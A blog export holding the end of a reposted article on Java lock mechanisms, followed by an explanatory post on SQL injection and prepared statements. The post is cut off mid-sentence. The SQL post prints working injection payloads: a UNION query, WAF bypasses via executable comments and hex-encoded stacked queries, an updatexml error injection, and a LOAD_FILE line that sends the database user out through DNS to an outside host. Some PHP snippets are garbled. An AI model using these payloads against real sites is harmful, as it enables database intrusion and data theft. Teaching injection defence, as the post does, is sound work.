如同我们在自旋锁中提到的 “阻塞或唤醒一个 Java 线程需要操作系统切换 CPU 状态来完成，这种状态转换需要耗费处理器时间。如果同步代码块中的内容过于简单，状态转换消耗的时间有可能比用户代码执行的时间还要长”。这种方式就是 synchronized 最初实现同步的方式，这就是 JDK 6 之前 synchronized 效率低的原因。这种依赖于操作系统 Mutex Lock 所实现的锁我们称之为“重量级锁”，JDK 6 中为了减少获得锁和释放锁带来的性能消耗，引入了“偏向锁” 和“轻量级锁”。
所以目前锁一共有 4 种状态，级别从低到高依次是：无锁、偏向锁、轻量级锁和重量级锁。锁状态只能升级不能降级。
通过上面的介绍，我们对 synchronized 的加锁机制以及相关知识有了一个了解，那么下面我们给出四种锁状态对应的的 Mark Word 内容，然后再分别讲解四种锁状态的思路以及特点：
锁状态存储内容存储内容无锁对象的 hashCode、对象分代年龄、是否是偏向锁（0）01偏向锁偏向线程 ID、偏向时间戳、对象分代年龄、是否是偏向锁（1）01轻量级锁指向栈中锁记录的指针00重量级锁指向互斥量（重量级锁）的指针10

无锁
无锁没有对资源进行锁定，所有的线程都能访问并修改同一个资源，但同时只有一个线程能修改成功。
无锁的特点就是修改操作在循环内进行，线程会不断的尝试修改共享资源。如果没有冲突就修改成功并退出，否则就会继续循环尝试。如果有多个线程修改同一个值，必定会有一个线程能修改成功，而其他修改失败的线程会不断重试直到修改成功。上面我们介绍的 CAS 原理及应用即是无锁的实现。无锁无法全面代替有锁，但无锁在某些场合下的性能是非常高的。
偏向锁
偏向锁是指一段同步代码一直被一个线程所访问，那么该线程会自动获取锁，降低获取锁的代价。
在大多数情况下，锁总是由同一线程多次获得，不存在多线程竞争，所以出现了偏向锁。其目标就是在只有一个线程执行同步代码块时能够提高性能。
当一个线程访问同步代码块并获取锁时，会在 Mark Word 里存储锁偏向的线程 ID。在线程进入和退出同步块时不再通过 CAS 操作来加锁和解锁，而是检测 Mark Word 里是否存储着指向当前线程的偏向锁。引入偏向锁是为了在无多线程竞争的情况下尽量减少不必要的轻量级锁执行路径，因为轻量级锁的获取及释放依赖多次 CAS 原子指令，而偏向锁只需要在置换 ThreadID 的时候依赖一次 CAS 原子指令即可。
偏向锁只有遇到其他线程尝试竞争偏向锁时，持有偏向锁的线程才会释放锁，线程不会主动释放偏向锁。偏向锁的撤销，需要等待全局安全点（在这个时间点上没有字节码正在执行），它会首先暂停拥有偏向锁的线程，判断锁对象是否处于被锁定状态。撤销偏向锁后恢复到无锁（标志位为 “01”）或轻量级锁（标志位为 “00”）的状态。
偏向锁在 JDK 6 及以后的 JVM 里是默认启用的。可以通过 JVM 参数关闭偏向锁：-XX:-UseBiasedLocking=false，关闭之后程序默认会进入轻量级锁状态。
轻量级锁
是指当锁是偏向锁的时候，被另外的线程所访问，偏向锁就会升级为轻量级锁，其他线程会通过自旋的形式尝试获取锁，不会阻塞，从而提高性能。
在代码进入同步块的时候，如果同步对象锁状态为无锁状态（锁标志位为 “01” 状态，是否为偏向锁为“0”），虚拟机首先将在当前线程的栈帧中建立一个名为锁记录（Lock Record）的空间，用于存储锁对象目前的 Mark Word 的拷贝，然后拷贝对象头中的 Mark Word 复制到锁记录中。
拷贝成功后，虚拟机将使用 CAS 操作尝试将对象的 Mark Word 更新为指向 Lock Record 的指针，并将 Lock Record 里的 owner 指针指向对象的 Mark Word。
如果这个更新动作成功了，那么这个线程就拥有了该对象的锁，并且对象 Mark Word 的锁标志位设置为 “00”，表示此对象处于轻量级锁定状态。
如果轻量级锁的更新操作失败了，虚拟机首先会检查对象的 Mark Word 是否指向当前线程的栈帧，如果是就说明当前线程已经拥有了这个对象的锁，那就可以直接进入同步块继续执行，否则说明多个线程竞争锁。
若当前只有一个等待线程，则该线程通过自旋进行等待。但是当自旋超过一定的次数，或者一个线程在持有锁，一个在自旋，又有第三个来访时，轻量级锁升级为重量级锁。
重量级锁
升级为重量级锁时，锁标志的状态值变为 “10”，此时 Mark Word 中存储的是指向重量级锁的指针，此时等待锁的线程都会进入阻塞状态。
整体的锁状态升级流程如下：

综上，偏向锁通过对比 Mark Word 解决加锁问题，避免执行 CAS 操作。而轻量级锁是通过用 CAS 操作和自旋来解决加锁问题，避免线程阻塞和唤醒而影响性能。重量级锁是将除了拥有锁的线程以外的线程都阻塞。
公平锁 VS 非公平锁公平锁是指多个线程按照申请锁的顺序来获取锁，线程直接进入队列中排队，队列中的第一个线程才能获得锁。公平锁的优点是等待锁的线程不会饿死。缺点是整体吞吐效率相对非公平锁要低，等待队列中除第一个线程以外的所有线程都会阻塞，CPU 唤醒阻塞线程的开销比非公平锁大。
非公平锁是多个线程加锁时直接尝试获取锁，获取不到才会到等待队列的队尾等待。但如果此时锁刚好可用，那么这个线程可以无需阻塞直接获取到锁，所以非公平锁有可能出现后申请锁的线程先获取锁的场景。非公平锁的优点是可以减少唤起线程的开销，整体的吞吐效率高，因为线程有几率不阻塞直接获得锁，CPU 不必唤醒所有线程。缺点是处于等待队列中的线程可能会饿死，或者等很久才会获得锁。
直接用语言描述可能有点抽象，这里作者用从别处看到的一个例子来讲述一下公平锁和非公平锁。

如上图所示，假设有一口水井，有管理员看守，管理员有一把锁，只有拿到锁的人才能够打水，打完水要把锁还给管理员。每个过来打水的人都要管理员的允许并拿到锁之后才能去打水，如果前面有人正在打水，那么这个想要打水的人就必须排队。管理员会查看下一个要去打水的人是不是队伍里排最前面的人，如果是的话，才会给你锁让你去打水；如果你不是排第一的人，就必须去队尾排队，这就是公平锁。
但是对于非公平锁，管理员对打水的人没有要求。即使等待队伍里有排队等待的人，但如果在上一个人刚打完水把锁还给管理员而且管理员还没有允许等待队伍里下一个人去打水时，刚好来了一个插队的人，这个插队的人是可以直接从管理员那里拿到锁去打水，不需要排队，原本排队等待的人只能继续等待。如下图所示：

接下来我们通过 ReentrantLock 的源码来讲解公平锁和非公平锁。

根据代码可知，ReentrantLock 里面有一个内部类 Sync，Sync 继承 AQS（AbstractQueuedSynchronizer），添加锁和释放锁的大部分操作实际上都是在 Sync 中实现的。它有公平锁 FairSync 和非公平锁 NonfairSync 两个子类。ReentrantLock 默认使用非公平锁，也可以通过构造器来显示的指定使用公平锁。
下面我们来看一下公平锁与非公平锁的加锁方法的源码:

通过上图中的源代码对比，我们可以明显的看出公平锁与非公平锁的lock()方法唯一的区别就在于公平锁在获取同步状态时多了一个限制条件：hasQueuedPredecessors()。

再进入 hasQueuedPredecessors()，可以看到该方法主要做一件事情：主要是判断当前线程是否位于同步队列中的第一个。如果是则返回 true，否则返回 false。
综上，公平锁就是通过同步队列来实现多个线程按照申请锁的顺序来获取锁，从而实现公平的特性。非公平锁加锁时不考虑排队等待问题，直接尝试获取锁，所以存在后申请却先获得锁的情况。
可重入锁 VS 非可重入锁可重入锁又名递归锁，是指在同一个线程在外层方法获取锁的时候，再进入该线程的内层方法会自动获取锁（前提锁对象得是同一个对象或者 class），不会因为之前已经获取过还没释放而阻塞。Java 中 ReentrantLock 和 synchronized 都是可重入锁，可重入锁的一个优点是可一定程度避免死锁。下面用示例代码来进行分析：
public class Widget &#123;
    public synchronized void doSomething() &#123;
        System.out.println(&quot;方法1执行...&quot;);
        doOthers();
    &#125;

    public synchronized void doOthers() &#123;
        System.out.println(&quot;方法2执行...&quot;);
    &#125;
&#125;

在上面的代码中，类中的两个方法都是被内置锁 synchronized 修饰的，doSomething() 方法中调用doOthers()方法。因为内置锁是可重入的，所以同一个线程在调用doOthers()时可以直接获得当前对象的锁，进入doOthers()进行操作。
如果是一个不可重入锁，那么当前线程在调用doOthers()之前需要将执行doSomething()时获取当前对象的锁释放掉，实际上该对象锁已被当前线程所持有，且无法释放。所以此时会出现死锁。
而为什么可重入锁就可以在嵌套调用时可以自动获得锁呢？我们通过图示和源码来分别解析一下。
还是打水的例子，有多个人在排队打水，此时管理员允许锁和同一个人的多个水桶绑定。这个人用多个水桶打水时，第一个水桶和锁绑定并打完水之后，第二个水桶也可以直接和锁绑定并开始打水，所有的水桶都打完水之后打水人才会将锁还给管理员。这个人的所有打水流程都能够成功执行，后续等待的人也能够打到水。这就是可重入锁。

但如果是非可重入锁的话，此时管理员只允许锁和同一个人的一个水桶绑定。第一个水桶和锁绑定打完水之后并不会释放锁，导致第二个水桶不能和锁绑定也无法打水。当前线程出现死锁，整个等待队列中的所有线程都无法被唤醒。

之前我们说过 ReentrantLock 和 synchronized 都是重入锁，那么我们通过重入锁 ReentrantLock 以及非可重入锁 NonReentrantLock 的源码来对比分析一下为什么非可重入锁在重复调用同步资源时会出现死锁。
首先 ReentrantLock 和 NonReentrantLock 都继承父类 AQS，其父类 AQS 中维护了一个同步状态 status 来计数重入次数，status 初始值为 0。
当线程尝试获取锁时，可重入锁先尝试获取并更新 status 值，如果 status == 0 表示没有其他线程在执行同步代码，则把 status 置为 1，当前线程开始执行。如果 status != 0，则判断当前线程是否是获取到这个锁的线程，如果是的话执行 status+1，且当前线程可以再次获取锁。而非可重入锁是直接去获取并尝试更新当前 status 的值，如果 status != 0 的话会导致其获取锁失败，当前线程阻塞。
释放锁时，可重入锁同样先获取当前 status 的值，在当前线程是持有锁的线程的前提下。如果 status-1 == 0，则表示当前线程所有重复获取锁的操作都已经执行完毕，然后该线程才会真正释放锁。而非可重入锁则是在确定当前线程是持有锁的线程之后，直接将 status 置为 0，将锁释放。

独享锁 VS 共享锁独享锁和共享锁同样是一种概念。我们先介绍一下具体的概念，然后通过 ReentrantLock 和 ReentrantReadWriteLock 的源码来介绍独享锁和共享锁。
独享锁也叫排他锁，是指该锁一次只能被一个线程所持有。如果线程 T 对数据 A 加上排它锁后，则其他线程不能再对 A 加任何类型的锁。获得排它锁的线程即能读数据又能修改数据。JDK 中的 synchronized 和 JUC 中 Lock 的实现类就是互斥锁。
共享锁是指该锁可被多个线程所持有。如果线程 T 对数据 A 加上共享锁后，则其他线程只能对 A 再加共享锁，不能加排它锁。获得共享锁的线程只能读数据，不能修改数据。
独享锁与共享锁也是通过 AQS 来实现的，通过实现不同的方法，来实现独享或者共享。
下图为 ReentrantReadWriteLock 的部分源码：

我们看到 ReentrantReadWriteLock 有两把锁：ReadLock 和 WriteLock，由词知意，一个读锁一个写锁，合称 “读写锁”。再进一步观察可以发现 ReadLock 和 WriteLock 是靠内部类 Sync 实现的锁。Sync 是 AQS 的一个子类，这种结构在 CountDownLatch、ReentrantLock、Semaphore 里面也都存在。
在 ReentrantReadWriteLock 里面，读锁和写锁的锁主体都是 Sync，但读锁和写锁的加锁方式不一样。读锁是共享锁，写锁是独享锁。读锁的共享锁可保证并发读非常高效，而读写、写读、写写的过程互斥，因为读锁和写锁是分离的。所以 ReentrantReadWriteLock 的并发性相比一般的互斥锁有了很大提升。
那读锁和写锁的具体加锁方式有什么区别呢？在了解源码之前我们需要回顾一下其他知识。 在最开始提及 AQS 的时候我们也提到了 state 字段（int 类型，32 位），该字段用来描述有多少线程获持有锁。
在独享锁中这个值通常是 0 或者 1（如果是重入锁的话 state 值就是重入的次数），在共享锁中 state 就是持有锁的数量。但是在 ReentrantReadWriteLock 中有读、写两把锁，所以需要在一个整型变量 state 上分别描述读锁和写锁的数量（或者也可以叫状态）。于是将 state 变量 “按位切割” 切分成了两个部分，高 16 位表示读锁状态（读锁个数），低 16 位表示写锁状态（写锁个数）。如下图所示：

了解了概念之后我们再来看代码，先看写锁的加锁源码：
protected final boolean tryAcquire(int acquires) &#123;
    Thread current &#x3D; Thread.currentThread();
    int c &#x3D; getState(); &#x2F;&#x2F; 取到当前锁的个数
    int w &#x3D; exclusiveCount(c); &#x2F;&#x2F; 取写锁的个数w
    if (c !&#x3D; 0) &#123; &#x2F;&#x2F; 如果已经有线程持有了锁(c!&#x3D;0)
    &#x2F;&#x2F; (Note: if c !&#x3D; 0 and w &#x3D;&#x3D; 0 then shared count !&#x3D; 0)
        if (w &#x3D;&#x3D; 0 || current !&#x3D; getExclusiveOwnerThread()) &#x2F;&#x2F; 如果写线程数（w）为0（换言之存在读锁） 或者持有锁的线程不是当前线程就返回失败
            return false;
        if (w + exclusiveCount(acquires) &gt; MAX_COUNT)    &#x2F;&#x2F; 如果写入锁的数量大于最大数（65535，2的16次方-1）就抛出一个Error。
      throw new Error(&quot;Maximum lock count exceeded&quot;);
        &#x2F;&#x2F; Reentrant acquire
    setState(c + acquires);
    return true;
  &#125;
  if (writerShouldBlock() || !compareAndSetState(c, c + acquires)) &#x2F;&#x2F; 如果当且写线程数为0，并且当前线程需要阻塞那么就返回失败；或者如果通过CAS增加写线程数失败也返回失败。
        return false;
    setExclusiveOwnerThread(current); &#x2F;&#x2F; 如果c&#x3D;0，w&#x3D;0或者c&gt;0，w&gt;0（重入），则设置当前线程或锁的拥有者
    return true;
&#125;


  这段代码首先取到当前锁的个数 c，然后再通过 c 来获取写锁的个数 w。因为写锁是低 16 位，所以取低 16 位的最大值与当前的 c 做与运算（ int w = exclusiveCount©; ），高 16 位和 0 与运算后是 0，剩下的就是低位运算的值，同时也是持有写锁的线程数目。
  在取到写锁线程的数目后，首先判断是否已经有线程持有了锁。如果已经有线程持有了锁 (c!=0)，则查看当前写锁线程的数目，如果写线程数为 0（即此时存在读锁）或者持有锁的线程不是当前线程就返回失败（涉及到公平锁和非公平锁的实现）。
  如果写入锁的数量大于最大数（65535，2 的 16 次方 - 1）就抛出一个 Error。
  如果当且写线程数为 0（那么读线程也应该为 0，因为上面已经处理 c!=0 的情况），并且当前线程需要阻塞那么就返回失败；如果通过 CAS 增加写线程数失败也返回失败。
  如果 c=0,w=0 或者 c&gt;0,w&gt;0（重入），则设置当前线程或锁的拥有者，返回成功！

tryAcquire() 除了重入条件（当前线程为获取了写锁的线程）之外，增加了一个读锁是否存在的判断。如果存在读锁，则写锁不能被获取，原因在于：必须确保写锁的操作对读锁可见，如果允许读锁在已被获取的情况下对写锁的获取，那么正在运行的其他读线程就无法感知到当前写线程的操作。
因此，只有等待其他读线程都释放了读锁，写锁才能被当前线程获取，而写锁一旦被获取，则其他读写线程的后续访问均被阻塞。写锁的释放与 ReentrantLock 的释放过程基本类似，每次释放均减少写状态，当写状态为 0 时表示写锁已被释放，然后等待的读写线程才能够继续访问读写锁，同时前次写线程的修改对后续的读写线程可见。
接着是读锁的代码：
protected final int tryAcquireShared(int unused) &#123;
    Thread current &#x3D; Thread.currentThread();
    int c &#x3D; getState();
    if (exclusiveCount(c) !&#x3D; 0 &amp;&amp;
        getExclusiveOwnerThread() !&#x3D; current)
        return -1;                                   &#x2F;&#x2F; 如果其他线程已经获取了写锁，则当前线程获取读锁失败，进入等待状态
    int r &#x3D; sharedCount(c);
    if (!readerShouldBlock() &amp;&amp;
        r &lt; MAX_COUNT &amp;&amp;
        compareAndSetState(c, c + SHARED_UNIT)) &#123;
        if (r &#x3D;&#x3D; 0) &#123;
            firstReader &#x3D; current;
            firstReaderHoldCount &#x3D; 1;
        &#125; else if (firstReader &#x3D;&#x3D; current) &#123;
            firstReaderHoldCount++;
        &#125; else &#123;
            HoldCounter rh &#x3D; cachedHoldCounter;
            if (rh &#x3D;&#x3D; null || rh.tid !&#x3D; getThreadId(current))
                cachedHoldCounter &#x3D; rh &#x3D; readHolds.get();
            else if (rh.count &#x3D;&#x3D; 0)
                readHolds.set(rh);
            rh.count++;
        &#125;
        return 1;
    &#125;
    return fullTryAcquireShared(current);
&#125;

可以看到在 tryAcquireShared(int unused) 方法中，如果其他线程已经获取了写锁，则当前线程获取读锁失败，进入等待状态。如果当前线程获取了写锁或者写锁未被获取，则当前线程（线程安全，依靠 CAS 保证）增加读状态，成功获取读锁。读锁的每次释放（线程安全的，可能有多个读线程同时释放读锁）均减少读状态，减少的值是 “1&lt;&lt;16”。所以读写锁才能实现读读的过程共享，而读写、写读、写写的过程互斥。
此时，我们再回头看一下互斥锁 ReentrantLock 中公平锁和非公平锁的加锁源码：

我们发现在 ReentrantLock 虽然有公平锁和非公平锁两种，但是它们添加的都是独享锁。根据源码所示，当某一个线程调用 lock 方法获取锁时，如果同步资源没有被其他线程锁住，那么当前线程在使用 CAS 更新 state 成功后就会成功抢占该资源。而如果公共资源被占用且不是被当前线程占用，那么就会加锁失败。所以可以确定 ReentrantLock 无论读操作还是写操作，添加的锁都是都是独享锁。
结语本文 Java 中常用的锁以及常见的锁的概念进行了基本介绍，并从源码以及实际应用的角度进行了对比分析。限于篇幅以及个人水平，没有在本篇文章中对所有内容进行深层次的讲解。
其实 Java 本身已经对锁本身进行了良好的封装，降低了研发同学在平时工作中的使用难度。但是研发同学也需要熟悉锁的底层原理，不同场景下选择最适合的锁。而且源码中的思路都是非常好的思路，也是值得大家去学习和借鉴的。
参考资料
 《Java 并发编程艺术》
 Java 中的锁
 Java CAS 原理剖析
 Java 并发——关键字 synchronized 解析
 Java synchronized 原理总结
 聊聊并发（二）——Java SE1.6 中的 Synchronized
 深入理解读写锁—ReadWriteLock 源码分析
 【JUC】JDK1.8 源码分析之 ReentrantReadWriteLock
 Java 多线程（十）之 ReentrantReadWriteLock 深入分析
 Java–读写锁的实现原理

作者简介
  家琪，美团点评后端工程师。2017 年加入美团点评，负责美团点评境内度假的业务开发。


转载: https://tech.meituan.com/2018/11/15/java-lock.html

]]></content>
      <tags>
        <tag>Java</tag>
        <tag>锁</tag>
      </tags>
  </entry>
  <entry>
    <title>深入理解SQL注入与预编译</title>
    <url>/2021/04/23/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3SQL%E6%B3%A8%E5%85%A5%E4%B8%8E%E9%A2%84%E7%BC%96%E8%AF%91/</url>
    <content><![CDATA[前言SQL注入是Web安全界地位很高的一个漏洞，它把矛头对准网站最为重要的数据库，利用成本低而危害巨大。若说一个普通开发人员有那么点儿安全意识，那一定和SQL注入有关。如今随着Web安全逐渐被重视，大家安全意识提升，同时各种预编译框架、ORM层出不穷，SQL注入已不像10年前那么泛滥，那么SQL注入的前世今生是怎样的？在这个预编译时代，SQL注入为何仍未销声匿迹？而预编译的底层又有哪些细节需要安全工程师知晓？这将是本文所重点探究之处。


注入原理剖析SQL注入的本质SQL注入的本质是『注入』，注入类攻击可被称为Web安全漏洞第一家族，内含SQL注入、命令注入、代码注入等，连XSS漏洞的本质其实都是HTML注入。而SQL注入自然是发生在SQL语句中的注入攻击。马三立先生有一段很著名的相声：
妈妈：『看着衣服，有人偷告诉妈妈』
小偷：『小孩你认识我吗？我叫逗你玩』
小孩：『妈妈有人偷咱家衣服』
妈妈：『谁啊？』
小孩：『逗你玩！』
妈妈：『介孩子！』
原本妈妈(数据库)想获取的是一个人名，即『数据』。但经过小偷(黑客)精心构造，小孩(SQL语句)将『逗你玩』(Payload)直接反馈给妈妈，导致妈妈理解成了一个『动作』。由数据到动作便是SQL注入的精髓所在，这会使黑客在数据库中任意执行SQL命令，不论后续有多少的奇技淫巧与绕过姿势，这样的本质总是不变的。一个简单的例子：
mysql_query(&quot;SELECT * FROM nowcoder WHERE id &#x3D; $id&quot;);

当黑客传入精心构造的数据 1 UNION SELECT version(), user()，整条语句会变为
mysql_query(&quot;SELECT * FROM nowcoder WHERE id &#x3D; 1 UNION SELECT version(), user()&quot;);

导致变为一个联合查询，将数据库的版本与当前用户泄露。
如果注入点被包裹在引号内，就传入引号，闭合SQL语句中原本的引号，使得攻击使用的Payload逃逸到引号外，成为SQL语法的一部分。
因此，SQL注入漏洞防御的核心就是阻止用户输入由『数据』变为『动作』。如使用反斜杠将用户输入中的引号转义，使其不能闭合SQL语句中原有的引号，无法影响引号外的部分，也就只能作为数据；又如PHP对付数字型SQL注入常用的intval，使得无论用户输入什么，最终都只能变为数字，或是使用addslashes转义引号，防止SQL语句中原本的引号被闭合使Payload逃逸到引号外；而预编译更是做到了极致，通过预先生成SQL语句语法树的方式，使得传入的数据永远也无法成为一个动作，关于其原理与对抗手段，文章将会在后续详细探讨。
SQL注入的类别关于SQL注入的分类是仁者见仁，智者见智的事，很多人喜欢将其分为字符型、数字型和搜索型。而我个人更喜欢布尔盲注、时间盲注、报错注入与联合查询的分类方式。
布尔盲注可谓是最基础的一种注入，其本质就是使SQL语句永真或永假，使页面上显示的内容不同，然后逐个字符的去判断，以此来得到数据库中的所有数据。
时间盲注是从布尔盲注的基础上发展而来，即如果存在盲注，但不论SQL语句是用真还是永假，页面都没有回显或没有明显变化，如何去判断SQL语句此时是真是假呢？可以使用sleep函数使SQL语句延迟一段时间后再返回结果，如果sleep函数与整个语句是且(and)的关系，那么为真的语句就会延时，为假的语句就不会延时。其他的部分与布尔盲注其实是相同的。在面试中，经常会被问到『如果sleep函数被禁用，如何进行时间盲注？』答案是使用benchmark函数，它的本意是向用户报告执行某个表达式的时间，使用它大批量执行一个任意表达式，也可达到延时的效果。
报错注入则是通过floor、extractvalue、updatexml等函数来实现的，这些函数有一个共同的特点，便是完成相应的功能需要进行两次及以上的操作。因此我们使其成功查询数据后进行处理的那次操作出错，也就将查出的数据暴露在了错误信息中，从而使我们得到想要的数据。
联合查询导致的注入则是原本的select语句后可以通过union关键字来拼接一个自定义select，从而为所欲为，查询任意想查询的数据。并且只需要自定义select所查询的列数与原select语句查询的列数相同，即可将数据正常显示在页面上。
从实战来看，这四种类型的注入点查询数据的速度为联合查询&gt;报错注入&gt;布尔盲注&gt;时间盲注，因为前两者可以直接查询想要的数据，而后两者则需要大量的试错，尤其是时间盲注，会将整个过程拉的很长，但时间盲注并不是没有优点。
我曾在面试中遇到过这样一个问题：如果你只有一次试验的机会，如何判定一个数据输入点是否存在SQL注入？答案是使用时间盲注，如sleep(4)，如果真的存在注入，则肯定会延时4秒再显示结果。其他类型的注入都非一次试验而能确定存在的，并且一个数据输入点只要存在注入，必定存在时间盲注。
注入功守道WAF的本质如果说我在SQL注入的本质中提到的三种SQL注入防御方式是对症下药，那么使用WAF进行防御就像是隔靴搔痒，无法根治漏洞。WAF的目的是在不可信数据被传给应用程序处理前，先将其过滤为可信数据。这里要提到一个概念：信任边界，即应用程序内的已定义的数据是处于信任边界内的，而任何来自用户输入的数据都处于信任边界外，属于不可信数据。华为的安全编码规范曾明确提出任何跨越信任边界传递的数据都需要被校验，因为所有的不可信数据都可能来自黑客攻击。
WAF通过过滤或拦截用户输入中的SQL片段来防御SQL注入，如黑客输入的数据为1 AND 1=1，WAF侦测到SQL关键字AND，就会将用户输入过滤为1 1=1，或干脆直接拦截掉本次请求。这将会导致一个问题，便是当正常用户输入YOU AND ME时，请求也会被过滤和拦截，这将会严重破坏用户体验。但如果将校验的关键字减少，又会带来许多绕过WAF进行攻击的方式。
由此可见，企业Web安全其实不是纯粹的Web安全技术，会夹杂很多用户体验与安全之间的权衡，甚至会考虑到程序猿们的开发体验。很多规模庞大复杂的祖传代码由于年久失修，会有各种各样的神奇BUG，如果重构，可能会带来彻底的崩溃。这个时候，游离在整个应用程序之外的WAF便是保证祖传代码安全性的最好选择。
综上，WAF就是个既有用也没用的矛盾体，让安全工程师们又爱又恨，绕过层出不穷却不得不用，只好缝缝补补又一年。
来自HTTP头的注入从上述防御姿势可以看出，很多网站要么使用WAF，要么在每处用户输入做严格过滤。
很多WAF其实都是按照用户输入的传入形式来配置防御的，比如GET请求，POST请求可能是两套不同的规则，都会专注于对传入参数的防御，那么如果此时攻击来自于Cookie呢？WAF不会过滤Cookie中的危险字符，但Web应用在进行数据库操作时，确实可能使用到Cookie中的值，此时我们只需使用Cookie值进行注入即可绕过WAF。
把这个概念推广开来，当HTTP请求中的其他请求头的值开始参与数据库操作时，都是存在注入风险的。比如Web应用将访问者的IP地址存入数据库，会对HTTP请求中的x-forwarded-for、x-remote-ip、x-client-ip获取后进行INSERT操作，一般的开发者可能只会将来自$_GET、$_POST的变量使用addslashes进行过滤，却不会意识到这种来自于$_COOKIE、_GET、$_POST的变量使用addslashes进行过滤，却不会意识到这种来自于$_COOKIE、_SERVER的变量同样存在安全风险。
可执行注释分享一个关于WAF有趣的点，当用户输入为：
an selection

select作为单词的一部分出现，为了保证用户体验，WAF不会进行拦截，于是，可以有一下绕过方式：
SELECT&#x2F;*a*&#x2F;*&#x2F;*a*&#x2F;FROM&#x2F;*a*&#x2F;nowcoder;

使用注释来替代空格，使得整条SQL语句伪装成一个长单词。WAF为了防止这种情况出现，会将注释去除，变为：
SELECT * FROM nowcoder;

这下可以拦截了，但MySQL对标准SQL进行了扩展，包含了一些自己的特性，为了保证在其它数据库中不被执行，MySQL将这些特殊句语放在特殊的注释中：
&#x2F;*!40101 SET @OLD_CHARACTER_SET_CLIENT&#x3D;@@CHARACTER_SET_CLIENT *&#x2F;;

这种以/*!开头的语句在MySQL中是可以被执行的，而在其他的数据库中却会被当做注释，在业界通常被称为『内联查询』。但这样的名称是不准确的，并没有这样的官方称谓，且内联查询另有其人，在这里我们仅称其为可执行注释。借由可执行注释的特性，我们可以发送这样的请求：
&#x2F;*!SELECT * FROM*&#x2F; nowcoder;

在不指定数据库的通用WAF看来，这样的输入仅仅只有一个nowcoder，从而放行，但数据库处理时却会查出nowcoder表的所有数据。
SQL注入中的OOB假设有这样一个场景：A知道一个秘密，但是碍于各种原因，不能直接告诉B，此时B要求A将秘密告诉C，B再从C处获得秘密即可。这便是OOB(Out-Of-Band)，意为请求外带，在渗透测试中，若目标服务器上A的关键数据无法直接回显，安全人员可以让安全服务器主动对另一台受控制的服务器C发出请求，并将关键数据写在请求中（通常是URL中），安全人员通过查看C上的访问记录，便可从URL中获取关键数据了。OOB可使用在命令注入、SSRF、XXE等漏洞利用过程中，在SQL注入中，MySQL数据库无法直接对外发起请求，但MySQL中的LOAD_FILE函数却可以解析域名，而域名在解析过程中，是可以在DNS服务器上留下记录的，安全人员只需通过自建DNS服务器，即可使用OOB获取关键数据。
OOB通常用于盲注中，盲注由于通过逐字符猜解的方式获得数据，非常缓慢，而大量请求更会直接导致被WAF封禁。此时便可以结合OOB进行SQL注入。使用OOB的前提条件为MySQL的secure_file_priv变量为空，当secure_file_priv为NULL或指定路径时，都无法无法利用LOAD_FILE函数进行OOB，secure_file_priv的状态可通过下面的命令进行查看：
show variables like &#39;%secure%&#39;;

而很遗憾，secure_file_priv的默认状态是NULL，但当Web应用本身使用了LOAD_FILE函数时，secure_file_priv通常会被设为空，此时就可以进行OOB了。
SELECT LOAD_FILE(CONCAT(&#39;\\\\&#39;, HEX(user()), &#39;.dnslog.com&#39;));

上述命令中的dnslog.com为安全人员拥有的网站，此条命令只会在dnslog.com的DNS服务器上留下解析记录，不会在网站服务器上留下访问日志。因此dnslog.com需要添加一条DNS记录，指向自建的DNS服务器，安全人员通过查看该自建DNS服务器的DNS解析记录即可获取该数据库当前用户名的hex编码，之后进行解码操作即可。进行hex编码是为了避免有域名允许范围之外的字符出现。
PDO中的多条执行PDO是PHP官方提供的预编译解决方案，之所以不将这个绕过姿势放在下篇预编译的章节中，是因为这不是PDO本身的绕过，而是错误使用PDO时对WAF的绕过。在PHP代码审计中，常常会见到PDO的不正确使用方式，如：
$pdo &#x3D; newPDO(&quot;mysql:host&#x3D;127.0.0.1;dbname&#x3D;nowcoder;charset&#x3D;gbk&quot;,&quot;root&quot;,&quot;123456&quot;);
id &#x3D; _GET[&#39;id&#39;];
query &#x3D; &quot;SELECT * FROM nowcoder WHERE id&#x3D;id&quot;;
stmt &#x3D; pdo-&gt;prepare($query);
$stmt-&gt;execute();
r &#x3D; stmt-&gt;fetch();
print_r($r);

虽然使用了PDO，看起来也使用prepare进行了预编译，但其实参数id仍然是拼接进去的，并没有用到防止预编译的根本性操作——参数绑定。这是开发人员对于PDO特性的不理解所导致的后果，造成了SQL注入。如果在这样一个场景中，外层有非常牛逼的硬WAF或者软WAF，使用极为严格的过滤规则将常见关键字如SELECT、UPDATE、INSERT等全部过滤，甚至连逗号也不放行，我们应该如何绕过并进行注入？
PDO有一个有趣的特性：默认可以支持多条SQL执行。即我们完全可以在参数中传入1;SELECT user(), version()来注入新的SQL，但这里有一个问题，那就是仅有第一条SQL语句的结果会显示在页面上，即使我们注入的第二条SQL被执行，也无法获取其结果。不过没关系，我们可以使用INSERT或UPDATE语句，将数据插入到表中再查询出来。如nowcoder表中只有两条数据：
id  name
------------
1  niumei
2  dalao

我们就可以通过执行以下Payload将数据库版本插入为第三条语句：
1;INSERT nowcoder VALUES(3,version());

然后再使id=3将其查询出来即可。回到我们刚刚的问题，如何绕过严格过滤的WAF？我们可以利用MySQL的PREPARE关键字对INSERT语句做一个预编译，然后通过EXECUTE关键字执行预编译好的语句：
PREPARE a FROM &#39;INSERT nowcoder VALUES(4,version())&#39;;
EXECUTE a;

当然，这还是没有解决过滤关键字的问题，我们可以利用MySQL的特性，将真正的SQL语句使用hex函数转为16进制：
SET @x&#x3D; 0x494E53455254206E6F77636F6465722056414C55455328342C76657273696F6E282929;
PREPARE a FROM @x;
EXECUTE a;

这样就完美绕过了WAF对SELECT、UPDATE、INSERT等常用关键字或逗号括号等字符的限制。如果想要杜绝这样的风险，只需拦截PREPARE、EXECUTE等关键字，或关闭PDO执行多条查询的功能即可。
特殊的注入二次注入二次注入本质上是信任边界不清晰的问题，最容易发生在靠WAF苟活的祖传代码上。一般来说，WAF拦截的是用户输入，但如果攻击来自于数据库呢？很多开发者并没有意识到，从数据库中读取到的数据其实也是处于信任边界之外的，如果代码本身对于SQL注入攻击没有应对措施，很容易被二次注入。
如更新用户名的一个场景：
username &#x3D; _POST[&#39;username&#39;];
id &#x3D; _SESSION[&#39;id&#39;];
mysql_query(&quot;UPDATE nowcoder SET uname &#x3D; &#39;username&#39; WHERE id &#x3D; id&quot;);

如果整个Web应用外没有WAF进行防御，这将是一个典型的UPDATE报错注入。当黑客将用户名设为&#39; or updatexml(1,concat(0x7e,(user())),0) or &#39;，所执行的SQL语句就会变为：
